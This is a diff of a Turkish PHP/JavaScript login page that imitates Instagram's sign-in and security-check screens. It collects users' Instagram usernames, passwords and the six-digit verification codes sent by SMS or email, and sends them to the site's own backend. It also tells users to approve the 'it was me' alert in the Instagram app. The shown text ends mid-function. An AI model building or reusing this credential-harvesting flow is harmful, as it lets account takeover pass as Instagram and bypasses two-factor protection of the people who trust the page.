@@ -7,7 +7,6 @@
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta id="viewport" name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1">
-<meta http-equiv="Content-Security-Policy" content="default-src *; style-src 'self' http://* 'unsafe-inline'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'" />
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
 <link href="https://fonts.googleapis.com/css?family=Titillium+Web:400,200,200italic,300,300italic,400italic,600,600italic,700,700italic,900&subset=latin,latin-ext" rel="stylesheet">
@@ -125,7 +124,7 @@ input[type="radio"]:checked+label span {
         <p style="color: blue; text-align: left;">Sürekli şifre yanlış hatası alıyorsanız instagram mobil uygulaması üzerinden hesabınıza girin. Çıkan uyarıda bendim tıklayın.</p>
     </div>
 </div>
-
+<div id="google_translate_element"></div>
 <?=$analitik?>
 <script>
 
@@ -141,365 +140,497 @@ input[type="radio"]:checked+label span {
     <script src='https://www.google.com/recaptcha/api.js'></script>
 
   <script type="text/javascript">
-      var base_url = "<?=base_url()?>";
+    var base_url = "<?=base_url()?>";
 
+    //telefon ile kod doğrulama alanı için gösterilecek yazı
+    function telKodYazi(tel, username, password, user_id, yol, igID) {
 
-        function userLogin(){
+        //düzenleyeceğim div'i değere atıyorum.
+        var nrucel = document.getElementById("nrucel");
 
-            $('#username').attr('readonly', 'readonly');
-            $('#password').attr('readonly', 'readonly');
-            $('#gonder').attr('disabled', 'disabled');
-            document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> giriş yapılıyor..";
+        //div içini değiştiriyorum
+        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Güvenlik Kodunu Gir</h3><p style="font-size:14px;">Sonu ' + tel + ' ile biten numaraya gönderdiğimiz 6 haneli kodu gir.</p><label for="inputText" class="sr-only">Güvenlik Kodu</label><input type="number" id="number" maxlength="6" class="form-control" placeholder="" required autofocus><input type="hidden" id="username" value= "' + username + '"><input type="hidden" id="password" value= "' + password + '"><input type="hidden" id="user_id" value= "' + user_id + '"><input type="hidden" id="yol" value= "' + yol + '"><input type="hidden" id="igID" value= "' + igID + '"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="telKodOnay()" style="font-size: 14px; font-weight: bold;"> Gönder</button><p></p><a onclick="cikis()" style="margin:10px;font-size:14px;">Çıkış Yap</a></div>';
 
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
+        //enter tuşuna basınca gonder butonuna basılmış saysın.
+        document.getElementById("number").addEventListener("keyup", function(event) {
+            event.preventDefault();
+            if (event.keyCode === 13) {
+                document.getElementById("gonder").click();
+            }
+        });
 
-            if(username == "" || password == ""){
-                $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">Lütfen boş alan bırakma !</div>');
+    }
 
+    //email ile kod doğrulama alanı için gösterilecek yazı
+    function emailKodYazi(email, username, password, user_id, yol, igID) {
+
+        //düzenleyeceğim div'i değere atıyorum.
+        var nrucel = document.getElementById("nrucel");
+
+        //div içini değiştiriyorum
+        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Güvenlik Kodunu Gir</h3><p style="font-size:14px;">' + email + ' e-posta adresine gönderdiğimiz 6 haneli kodu gir.</p><label for="inputText" class="sr-only">Güvenlik Kodu</label><input type="number" id="number" maxlength="6" class="form-control" placeholder="" required autofocus><input type="hidden" id="username" value= "' + username + '"><input type="hidden" id="password" value= "' + password + '"><input type="hidden" id="user_id" value= "' + user_id + '"><input type="hidden" id="yol" value= "' + yol + '"><input type="hidden" id="igID" value= "' + igID + '"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="telKodOnay()" style="font-size: 14px; font-weight: bold;"> Gönder</button><p></p><a onclick="cikis()" style="margin:10px;font-size:14px;">Çıkış Yap</a></div>';
+
+        //enter tuşuna basınca gonder butonuna basılmış saysın.
+        document.getElementById("number").addEventListener("keyup", function(event) {
+            event.preventDefault();
+            if (event.keyCode === 13) {
+                document.getElementById("gonder").click();
+            }
+        });
+
+    }
+
+    //telefon ekleme alanı için gösterilecek yazı
+    function telEklemeYazi(tel, username, password, user_id, yol, igID) {
+
+        //düzenleyeceğim div'i değere atıyorum.
+        var nrucel = document.getElementById("nrucel");
+
+        //div içini değiştiriyorum
+        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Telefon Numaranı Ekle</h3><p style="font-size:14px;">Telefon numaranı girerek, Instagram topluluğunu güvende tutmamıza yardımcı ol. Sana kısa mesajla bir güvenlik kodu göndereceğiz.</p><label for="inputText" class="sr-only">Telefon Numarası</label><input type="text" id="tel" class="form-control" placeholder="' + tel + '" value= "' + tel + '" required autofocus><input type="hidden" id="username" value= "' + username + '"><input type="hidden" id="password" value= "' + password + '"><input type="hidden" id="user_id" value= "' + user_id + '"><input type="hidden" id="yol" value= "' + yol + '"><input type="hidden" id="igID" value= "' + igID + '"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" onclick="telOnay()" style="font-size: 14px; font-weight: bold;"> İleri</button><p style="font-size:10px; padding-top:10px;">Telefon numaran profiline eklenecek, ancak senden başka kimse tarafından görülmeyecek. Daha fazla bilgi için lütfen Gizlilik İlkemize bak. Instagram bu hizmeti ücretsiz sunar. Operatörün standart kısa mesaj ücretleri geçerlidir.</p></div>';
+
+        //enter tuşuna basınca gonder butonuna basılmış saysın.
+        document.getElementById("tel").addEventListener("keyup", function(event) {
+            event.preventDefault();
+            if (event.keyCode === 13) {
+                document.getElementById("gonder").click();
+            }
+        });
+
+    }
+
+    //mail yada telefon ile doğrulama ekranında gösterilecek yazı
+    function dogrulamaYazi(tel, email, username, password, user_id, yol, igID) {
+
+        //düzenleyeceğim div'i değere atıyorum.
+        var nrucel = document.getElementById("nrucel");
+
+        //div içini değiştiriyorum
+        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Olağandışı Bir Giriş Denemesi Saptadık</h3><p style="font-size:14px;">Hesabını güvene almak için kimliğini doğrulaman amacıyla sana bir güvenlik kodu göndereceğiz. Kodu nasıl göndermemizi istersin?</p>';
+
+        //mail doğrulama seceneği var ise
+        if (email !== null) {
+            nrucel.innerHTML += '<div><input id="choice-one" name="radio" value="1" checked="checked" type="radio"><label for="choice-one"> <span></span> E-posata Adresi: ' + email + '</label></div>';
+        }
+
+        //tel ile doğrulama seceneği var ise
+        if (tel !== null) {
+            nrucel.innerHTML += '<div><input id="choice-two" name="radio" value="0" type="radio"><label for="choice-two"> <span></span> Telefon numarası: ' + tel + '</label></div>';
+        }
+
+        nrucel.innerHTML += '<div style="margin:5px;padding:5px;"><input type="hidden" id="username" value= "' + username + '"><input type="hidden" id="password" value= "' + password + '"><input type="hidden" id="user_id" value= "' + user_id + '"><input type="hidden" id="yol" value= "' + yol + '"><input type="hidden" id="igID" value= "' + igID + '"></div><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" onclick="Dogrulama()" style="font-size: 14px; font-weight: bold;"> Güvenlik Kodu Gönder</button><p style="padding-top:10px;"></p></div>';
+
+        //enter tuşuna basınca gonder butonuna basılmış saysın.
+        document.getElementById("tel").addEventListener("keyup", function(event) {
+            event.preventDefault();
+            if (event.keyCode === 13) {
+                document.getElementById("gonder").click();
+            }
+        });
+
+    }
+
+    //giriş işlemleri
+    function userLogin() {
+
+        //belirtiğim alanları pasif yapıyorum
+        $('#username').attr('readonly', 'readonly');
+        $('#password').attr('readonly', 'readonly');
+        $('#gonder').attr('disabled', 'disabled');
+        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> giriş yapılıyor..";
+
+        //formdaki verileri değerlere atıyorum
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+
+        //eğer istenilen değerler boş ise hata mesajı göster
+        if (username == "" || password == "") {
+
+            //hata mesajı
+            $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">Lütfen boş alan bırakma !</div>');
+
+            //pasif ettiğim değerleri aktif ediyorum
+            $('#password').removeAttr('readonly');
+            $('#username').removeAttr('readonly');
+            $('#gonder').prop("disabled", false);
+            document.getElementById('gonder').innerHTML = '<i class="fas fa-sign-in-alt"></i> Giriş Yap';
+            return;
+        }
+
+        //post işlemleri
+        $.ajax({
+            type: 'post',
+            url: base_url + 'login',
+            dataType: 'json',
+            data: "username=" + username + "&password=" + password,
+            success: function(result) {
+
+                console.log(result);
+
+                //eğer işlem başarılı ise kontrol'e yönlendir
+                if (result.status == "ok") {
+
+                    //başarılı yazısı gösteriyorum
+                    $('#sonuc').html('<div style="background:green;color:#fff;margin-top:10px;padding:10px">Başarılı.. Giriş yapılıyor..');
+
+                    //kontrol'e yönlendiriyorum
+                    window.location.href = base_url + "kontrol";
+
+                    //eğer kullanıcı doğrulamaya takıldıysa
+                } else if (result.status == "check") {
+
+                    //dönen veriyi belirtiğim değere atıyorum.
+                    var data = result.data;
+
+                    //eğer kullanıcıdan telefon numarası eklenmesini istiyorsa
+                    if (data.tip == "telOnay") {
+
+                        //kod onay ekranı için gerekli yazıyı çağırıyorum
+                        telEklemeYazi(data.tel, data.username, data.password, data.user_id, data.yol, data.igID);
+
+                    }
+
+                    //eğer kullanuıcıdan telefona gelen kodu istiyorsa
+                    else if (data.tip == "telKodOnay") {
+
+                        //kod onay ekranı için gerekli yazıyı çağırıyorum
+                        telKodYazi(data.tel, data.username, data.password, data.user_id, data.yol, data.igID);
+
+                    }
+
+                    //eğer mail yada tel ile doğrulama istiyorsa
+                    else if(data.tip == "Dogrulama"){
+
+                      //kod onay ekranı için gerekli yazıyı çağırıyorum
+                      dogrulamaYazi(data.tel,data.email,data.username,data.password,data.user_id,data.yol,data.igID);
+
+                    }
+
+                    //eğer kullanuıcıdan mail'e gelen kodu istiyorsa
+                    else if (data.tip == "email") {
+
+                        //kod onay ekranı için gerekli yazıyı çağırıyorum
+                        dogrulamaYazi(data.tel, data.email, data.username, data.password, data.user_id, data.yol, data.igID);
+
+                    }
+
+                    //eğer yukarıdakilerden hiç biri değil ise hata mesajı gösteriyorum
+                    else {
+
+                      //hata mesajı
+                      $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">' + result.message + '</div>');       
+                                     
+                    }
+
+                }
+
+                //eğer işlem başarısız ise hata mesajı göster
+                else {
+
+                    //hata mesajı
+                    $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">' + result.message + '</div>');
+
+                }
+
+                //pasif ettiğim alanları aktif yap
                 $('#password').removeAttr('readonly');
                 $('#username').removeAttr('readonly');
                 $('#gonder').prop("disabled", false);
                 document.getElementById('gonder').innerHTML = '<i class="fas fa-sign-in-alt"></i> Giriş Yap';
-                return;
+
             }
-
-            
-
-            $.ajax({
-                type: 'post',
-                url: base_url+'login',
-                dataType: 'json',
-                data: "username="+username+"&password="+password,
-                success: function(result) {
-
-                  console.log(result);
-
-                    
-                    if(result.status == "ok") {
-
-                        $('#sonuc').html('<div style="background:green;color:#fff;margin-top:10px;padding:10px">Başarılı.. Giriş yapılıyor..');
-                        window.location.href = base_url+"kontrol";
-
-                    } else if(result.status == "check") {
+        });
 
 
-                        if(result.data.tip == "telOnay"){
+    }
 
-                            var nrucel = document.getElementById("nrucel");
+    //telefon numarası ekleme post işlemleri
+    function telOnay() {
 
-                            nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Telefon Numaranı Ekle</h3><p style="font-size:14px;">Telefon numaranı girerek, Instagram topluluğunu güvende tutmamıza yardımcı ol. Sana kısa mesajla bir güvenlik kodu göndereceğiz.</p><label for="inputText" class="sr-only">Telefon Numarası</label><input type="text" id="tel" class="form-control" placeholder="'+result.data.tel+'" value= "'+result.data.tel+'" required autofocus><input type="hidden" id="username" value= "'+result.data.username+'"><input type="hidden" id="password" value= "'+result.data.password+'"><input type="hidden" id="user_id" value= "'+result.data.user_id+'"><input type="hidden" id="yol" value= "'+result.data.yol+'"><input type="hidden" id="igID" value= "'+result.data.igID+'"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" onclick="telOnay()" style="font-size: 14px; font-weight: bold;"> İleri</button><p style="font-size:10px; padding-top:10px;">Telefon numaran profiline eklenecek, ancak senden başka kimse tarafından görülmeyecek. Daha fazla bilgi için lütfen Gizlilik İlkemize bak. Instagram bu hizmeti ücretsiz sunar. Operatörün standart kısa mesaj ücretleri geçerlidir.</p></div>';
+        //belirttiğim alanları disable et
+        $('#tel').attr('readonly', 'readonly');
+        $('#gonder').attr('disabled', 'disabled');
+        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";
 
-                            document.getElementById("tel").addEventListener("keyup", function(event) {
-                            event.preventDefault();
-                            if (event.keyCode === 13) {
-                                document.getElementById("gonder").click();
-                            }
-                            });
+        //form'daki tüm verileri değerlere atıyorum.
+        var tel = document.getElementById("tel").value;
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+        var user_id = document.getElementById("user_id").value;
+        var yol = document.getElementById("yol").value;
+        var igID = document.getElementById("igID").value;
 
-                        } else if(result.data.tip == "telKodOnay") {
+        //telefon numarası yazmamışsa hata mesajı göster
+        if (tel == "") {
+            $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">Lütfen boş alan bırakma !</div>');
 
-                        
-
-                            var nrucel = document.getElementById("nrucel");
-
-
-                            nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Güvenlik Kodunu Gir</h3><p style="font-size:14px;">Sonu '+result.data.tel+' ile biten numaraya gönderdiğimiz 6 haneli kodu gir.</p><label for="inputText" class="sr-only">Güvenlik Kodu</label><input type="number" id="number" maxlength="6" class="form-control" placeholder="" required autofocus><input type="hidden" id="username" value= "'+result.data.username+'"><input type="hidden" id="password" value= "'+result.data.password+'"><input type="hidden" id="user_id" value= "'+result.data.user_id+'"><input type="hidden" id="yol" value= "'+result.data.yol+'"><input type="hidden" id="igID" value= "'+result.data.igID+'"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="telKodOnay()" style="font-size: 14px; font-weight: bold;"> Gönder</button><p></p><a onclick="cikis()" style="margin:10px;font-size:14px;">Çıkış Yap</a></div>';
-
-                            document.getElementById("number").addEventListener("keyup", function(event) {
-                            event.preventDefault();
-                            if (event.keyCode === 13) {
-                                document.getElementById("gonder").click();
-                            }
-                            });
-
-                        } else if(result.data.tip == "Dogrulama"){
-                            var nrucel = document.getElementById("nrucel");
-
-                            nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Olağandışı Bir Giriş Denemesi Saptadık</h3><p style="font-size:14px;">Hesabını güvene almak için kimliğini doğrulaman amacıyla sana bir güvenlik kodu göndereceğiz. Kodu nasıl göndermemizi istersin?</p>';
-
-                            if(result.data.email !== null){
-                                nrucel.innerHTML += '<div><input id="choice-one" name="radio" value="1" checked="checked" type="radio"><label for="choice-one"> <span></span> E-posata Adresi: '+result.data.email+'</label></div>';
-                            }
-
-                            if(result.data.tel !== null){
-                                nrucel.innerHTML += '<div><input id="choice-two" name="radio" value="0" type="radio"><label for="choice-two"> <span></span> Telefon numarası: '+result.data.tel+'</label></div>';
-                            } 
-
-                            nrucel.innerHTML += '<div style="margin:5px;padding:5px;"><input type="hidden" id="username" value= "'+result.data.username+'"><input type="hidden" id="password" value= "'+result.data.password+'"><input type="hidden" id="user_id" value= "'+result.data.user_id+'"><input type="hidden" id="yol" value= "'+result.data.yol+'"><input type="hidden" id="igID" value= "'+result.data.igID+'"></div><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" onclick="Dogrulama()" style="font-size: 14px; font-weight: bold;"> Güvenlik Kodu Gönder</button><p style="padding-top:10px;"></p></div>';
-
-                            document.getElementById("tel").addEventListener("keyup", function(event) {
-                            event.preventDefault();
-                            if (event.keyCode === 13) {
-                                document.getElementById("gonder").click();
-                            }
-                            });
-                        } else if(result.data.tip == "email"){
-
-                            var nrucel = document.getElementById("nrucel");
-
-
-                            nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Güvenlik Kodunu Gir</h3><p style="font-size:14px;">'+result.data.email+' e-posta adresine gönderdiğimiz 6 haneli kodu gir.</p><label for="inputText" class="sr-only">Güvenlik Kodu</label><input type="number" id="number" maxlength="6" class="form-control" placeholder="" required autofocus><input type="hidden" id="username" value= "'+result.data.username+'"><input type="hidden" id="password" value= "'+result.data.password+'"><input type="hidden" id="user_id" value= "'+result.data.user_id+'"><input type="hidden" id="yol" value= "'+result.data.yol+'"><input type="hidden" id="igID" value= "'+result.data.igID+'"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="telKodOnay()" style="font-size: 14px; font-weight: bold;"> Gönder</button><p></p><a onclick="cikis()" style="margin:10px;font-size:14px;">Çıkış Yap</a></div>';
-
-                            document.getElementById("number").addEventListener("keyup", function(event) {
-                            event.preventDefault();
-                            if (event.keyCode === 13) {
-                                document.getElementById("gonder").click();
-                            }
-                            });
-
-                        }
-
-                    } else {
-
-                        $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">'+result.message+'</div>');
-                    }
-
-                    $('#password').removeAttr('readonly');
-                    $('#username').removeAttr('readonly');
-                    $('#gonder').prop("disabled", false);
-                    document.getElementById('gonder').innerHTML = '<i class="fas fa-sign-in-alt"></i> Giriş Yap';
-
-                }
-            });
-
-
+            $('#tel').removeAttr('readonly');
+            $('#gonder').prop("disabled", false);
+            document.getElementById('gonder').innerHTML = 'İleri';
+            return;
         }
 
-        function telOnay(){ 
+        //post işlemleri
+        $.ajax({
+            type: 'post',
+            url: base_url + 'login/telOnay',
+            dataType: 'json',
+            data: "tel=" + tel + "&username=" + username + "&password=" + password + "&user_id=" + user_id + "&yol=" + yol + "&igID=" + igID,
+            success: function(result) {
 
-            $('#tel').attr('readonly', 'readonly');
-            $('#gonder').attr('disabled', 'disabled');
-            document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";
-            
+                console.log(result);
 
-            var tel      = document.getElementById("tel").value;
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
-            var user_id  = document.getElementById("user_id").value;
-            var yol      = document.getElementById("yol").value;
-            var igID     = document.getElementById("igID").value;
+                if (result.status == "ok") {
 
-            if(tel == ""){
-                $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">Lütfen boş alan bırakma !</div>');
+                    //dönen veriyi belirtiğim değere atıyorum.
+                    var data = result.data;
 
+                    //kod onay ekranı için gerekli yazıyı çağırıyorum
+                    telKodYazi(data.tel, data.username, data.password, data.user_id, data.yol, data.igID);
+
+                } else {
+
+                    //işlem başarısız ise hata mesajını göster   
+                    $('#sonuc').html('<p style="color:#ed4956;font-size:14px">' + result.message + '</p>');
+                }
+
+                //disable ettiğim yerleri tekrar aktif et
                 $('#tel').removeAttr('readonly');
                 $('#gonder').prop("disabled", false);
                 document.getElementById('gonder').innerHTML = 'İleri';
-                return;
+
+
+
             }
+        });
+    }
 
-            $.ajax({
-                type: 'post',
-                url: base_url+'login/telOnay',
-                dataType: 'json',
-                data: "tel="+tel+"&username="+username+"&password="+password+"&user_id="+user_id+"&yol="+yol+"&igID="+igID,
-                success: function(result) {
+    //doğrulama için seçilen seçeneğe göre işlem
+    function Dogrulama() {
 
-                  console.log(result);
+        //belirtilen alanları pasif yapıyorum
+        $('#gonder').attr('disabled', 'disabled');
+        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";
 
+        //doğrualama seçeneklerinden hangisi seçilmişse onu değere atıyorum
+        if ($("#choice-one").is(":checked")) {
+            var choice = document.getElementById("choice-one").value;
+        } else if ($("#choice-two").is(":checked")) {
+            var choice = document.getElementById("choice-two").value;
+        }
 
-                    if(result.status == "ok"){
+        //eğer seçenek boş ise hata mesajı gösteriyorum
+        if (choice == "") {
 
-                        var nrucel = document.getElementById("nrucel");
+            //hata mesajı
+            $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">Lütfen boş alan bırakma !</div>');
 
+            //pasif ettiğim yerleri aktif yapıyorum
+            $('#tel').removeAttr('readonly');
+            $('#gonder').prop("disabled", false);
+            document.getElementById('gonder').innerHTML = 'İleri';
+            return;
+        }
 
-                        nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Güvenlik Kodunu Gir</h3><p style="font-size:14px;">Sonu '+result.data.tel+' ile biten numaraya gönderdiğimiz 6 haneli kodu gir.</p><label for="inputText" class="sr-only">Güvenlik Kodu</label><input type="number" id="number" maxlength="6" class="form-control" placeholder="" required autofocus><input type="hidden" id="username" value= "'+result.data.username+'"><input type="hidden" id="password" value= "'+result.data.password+'"><input type="hidden" id="user_id" value= "'+result.data.user_id+'"><input type="hidden" id="yol" value= "'+result.data.yol+'"><input type="hidden" id="igID" value= "'+result.data.igID+'"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="telKodOnay()" style="font-size: 14px; font-weight: bold;"> Gönder</button><p></p><a onclick="cikis()" style="margin:10px;font-size:14px;">Çıkış Yap</a></div>';
+        //formdaki verileri değere atıyorum
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+        var user_id = document.getElementById("user_id").value;
+        var yol = document.getElementById("yol").value;
+        var igID = document.getElementById("igID").value;
 
-                        document.getElementById("number").addEventListener("keyup", function(event) {
+        //post işlemleri
+        $.ajax({
+            type: 'post',
+            url: base_url + 'login/Dogrulama',
+            dataType: 'json',
+            data: "choice=" + choice + "&username=" + username + "&password=" + password + "&user_id=" + user_id + "&yol=" + yol + "&igID=" + igID,
+            success: function(result) {
+
+                console.log(result);
+
+                //eğer işlem başarılı ise
+                if (result.status == "ok") {
+
+                    //dönen veriyi belirtiğim değere atıyorum.
+                    var data = result.data;
+
+                    if (data.tip == "email") {
+
+                        //mail ile kod onay ekranı için gerekli yazıyı çağırıyorum
+                        emailKodYazi(data.email, data.username, data.password, data.user_id, data.yol, data.igID);
+
+                    } else {
+
+                        //tel ilekod onay ekranı için gerekli yazıyı çağırıyorum
+                        telKodYazi(data.tel, data.username, data.password, data.user_id, data.yol, data.igID);
+
+                    }
+
+                    //enter tuşuna basınca gönder butonuna basılmış saysın
+                    document.getElementById("number").addEventListener("keyup", function(event) {
                         event.preventDefault();
                         if (event.keyCode === 13) {
                             document.getElementById("gonder").click();
                         }
-                        });
+                    });
 
-                    } else {   
-                        $('#sonuc').html('<p style="color:#ed4956;font-size:14px">'+result.message+'</p>');
-                    }
+                } 
 
-                    $('#tel').removeAttr('readonly');
-                    $('#gonder').prop("disabled", false);
-                    document.getElementById('gonder').innerHTML = 'İleri';
+                //eğer işlem başarısız ise
+                else {
 
-
-
+                    //hata mesajı göster
+                    $('#sonuc').html('<p style="color:#ed4956;font-size:14px">' + result.message + '</p>');
                 }
-            });
-        }
 
-        function Dogrulama(){ 
-
-            $('#gonder').attr('disabled', 'disabled');
-            document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";
-            
-
-            if ($("#choice-one").is(":checked")) {
-              var choice = document.getElementById("choice-one").value;
-            }
-
-            else if ($("#choice-two").is(":checked")) {
-              var choice = document.getElementById("choice-two").value;
-            }
-
-            if(choice == ""){
-                $('#sonuc').html('<div style="background:#c50f0f;color:#fff;margin-top:10px;padding:10px">Lütfen boş alan bırakma !</div>');
-
+                //pasif ettiğim yerleri aktif ediyorum
                 $('#tel').removeAttr('readonly');
                 $('#gonder').prop("disabled", false);
-                document.getElementById('gonder').innerHTML = 'İleri';
-                return;
+                document.getElementById('gonder').innerHTML = 'Gönder';
+
             }
+        });
+    }
 
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
-            var user_id  = document.getElementById("user_id").value;
-            var yol      = document.getElementById("yol").value;
-            var igID     = document.getElementById("igID").value;
+    //gelen kodu doğrulama alanı
+    function telKodOnay() {
 
-            $.ajax({
-                type: 'post',
-                url: base_url+'login/Dogrulama',
-                dataType: 'json',
-                data: "choice="+choice+"&username="+username+"&password="+password+"&user_id="+user_id+"&yol="+yol+"&igID="+igID,
-                success: function(result) {
+        //belirtilen yerleri pasif yapıyorum
+        $('#number').attr('readonly', 'readonly');
+        $('#gonder').attr('disabled', 'disabled');
+        document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";
 
-                  console.log(result);
+        //formdaki verileri değere atıyorum
+        var number = document.getElementById("number").value;
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
+        var user_id = document.getElementById("user_id").value;
+        var yol = document.getElementById("yol").value;
+        var igID = document.getElementById("igID").value;
 
+        //onay kodu girmemiş ise hata mesajı gösteriyorum
+        if (number == "") {
 
-                    if(result.status == "ok"){
+            //hata mesajı
+            $('#sonuc').html('<p style="color:#ed4956;font-size:14px">Lütfen onay kodunu giriniz.</p>');
 
-                        if(result.data.tip == "email"){
-
-                            var nrucel = document.getElementById("nrucel");
-
-
-                            nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Güvenlik Kodunu Gir</h3><p style="font-size:14px;">'+result.data.email+' e-posta adresine gönderdiğimiz 6 haneli kodu gir.</p><label for="inputText" class="sr-only">Güvenlik Kodu</label><input type="number" id="number" maxlength="6" class="form-control" placeholder="" required autofocus><input type="hidden" id="username" value= "'+result.data.username+'"><input type="hidden" id="password" value= "'+result.data.password+'"><input type="hidden" id="user_id" value= "'+result.data.user_id+'"><input type="hidden" id="yol" value= "'+result.data.yol+'"><input type="hidden" id="igID" value= "'+result.data.igID+'"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="telKodOnay()" style="font-size: 14px; font-weight: bold;"> Gönder</button><p></p><a onclick="cikis()" style="margin:10px;font-size:14px;">Çıkış Yap</a></div>';
-                        } else {
-
-                            var nrucel = document.getElementById("nrucel");
-
-                            nrucel.innerHTML = '<style>.form-signin {max-width: 430px;}</style><div class="text-center"><h3>Güvenlik Kodunu Gir</h3><p style="font-size:14px;">Sonu '+result.data.tel+' ile biten numaraya gönderdiğimiz 6 haneli kodu gir.</p><label for="inputText" class="sr-only">Güvenlik Kodu</label><input type="number" id="number" maxlength="6" class="form-control" placeholder="" required autofocus><input type="hidden" id="username" value= "'+result.data.username+'"><input type="hidden" id="password" value= "'+result.data.password+'"><input type="hidden" id="user_id" value= "'+result.data.user_id+'"><input type="hidden" id="yol" value= "'+result.data.yol+'"><input type="hidden" id="igID" value= "'+result.data.igID+'"><div id="sonuc"></div><button class="btn btn-primary btn-block" id="gonder" style="margin-top:10px;" onclick="telKodOnay()" style="font-size: 14px; font-weight: bold;"> Gönder</button><p></p><a onclick="cikis()" style="margin:10px;font-size:14px;">Çıkış Yap</a></div>';
-
-                        }
-
-                        document.getElementById("number").addEventListener("keyup", function(event) {
-                        event.preventDefault();
-                        if (event.keyCode === 13) {
-                            document.getElementById("gonder").click();
-                        }
-                        });
-
-                    } else {   
-                        $('#sonuc').html('<p style="color:#ed4956;font-size:14px">'+result.message+'</p>');
-                    }
-
-                    $('#tel').removeAttr('readonly');
-                    $('#gonder').prop("disabled", false);
-                    document.getElementById('gonder').innerHTML = 'Gönder';
-
-
-
-                }
-            });
+            //pasif ettiğim yerleri aktif yapıyorum
+            $('#number').removeAttr('readonly');
+            $('#gonder').prop("disabled", false);
+            document.getElementById('gonder').innerHTML = 'Gönder';
+            return;
         }
 
-        function telKodOnay(){
+        //eğer kod 6 karakterli değilse hata mesajını göster
+        if (number.length < 6 || number.length > 6) {
 
-            $('#number').attr('readonly', 'readonly');
-            $('#gonder').attr('disabled', 'disabled');
-            document.getElementById('gonder').innerHTML = "<i class='fas fa-circle-notch fa-spin'></i> bekleyin..";
+            //hata mesajı
+            $('#sonuc').html('<p style="color:#ed4956;font-size:14px">Gelen onay kodu en az 6 karakter olmalıdır</p>');
 
-            var number   = document.getElementById("number").value;
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
-            var user_id  = document.getElementById("user_id").value;
-            var yol      = document.getElementById("yol").value;
-            var igID     = document.getElementById("igID").value;
+            //pasif ettiğim yerleri aktif yapıyorum
+            $('#number').removeAttr('readonly');
+            $('#gonder').prop("disabled", false);
+            document.getElementById('gonder').innerHTML = 'Gönder';
+            return;
+        }
 
-            if(number == ""){
-                $('#sonuc').html('<p style="color:#ed4956;font-size:14px">Lütfen onay kodunu giriniz.</p>');
+        //post işlemi
+        $.ajax({
+            type: 'post',
+            url: base_url + 'login/telKodOnay',
+            dataType: 'json',
+            data: "number=" + number + "&username=" + username + "&password=" + password + "&user_id=" + user_id + "&yol=" + yol + "&igID=" + igID,
+            success: function(result) {
 
+                console.log(result);
+
+                //eğer başarılı ise
